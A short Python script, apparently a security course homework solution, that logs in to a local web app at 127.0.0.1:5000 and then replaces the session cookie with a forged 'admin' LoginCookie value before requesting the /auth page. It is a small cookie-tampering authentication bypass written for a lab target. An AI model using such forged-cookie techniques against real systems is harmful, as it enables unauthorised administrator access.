import requests

# create a session
session = requests.session()

URL = 'http://127.0.0.1:5000'

# perform a GET
#session.get("http://url_or_ip_address:port")

def try_to_login(username, password):
	login_data = {
		'username': username,
		'password': password
	}
	r = session.post(f'{URL}/login', data=login_data)
	print(r.text)
	print(session.cookies)

def auth():
	session.get(f'{URL}/auth')

# inspect your cookies
#print(session.cookies)

# modify your cookies
#session.cookies.update({"name1": "value1"})
try_to_login('admin', 'pera')

session.cookies.update({
	'LoginCookie': 'admin,32131231,com402,hw2,ex2,admin,1369DDD511FBEE542097BC994D96AAB47C960983D10A79911E869EEC57D76F61'
})

auth()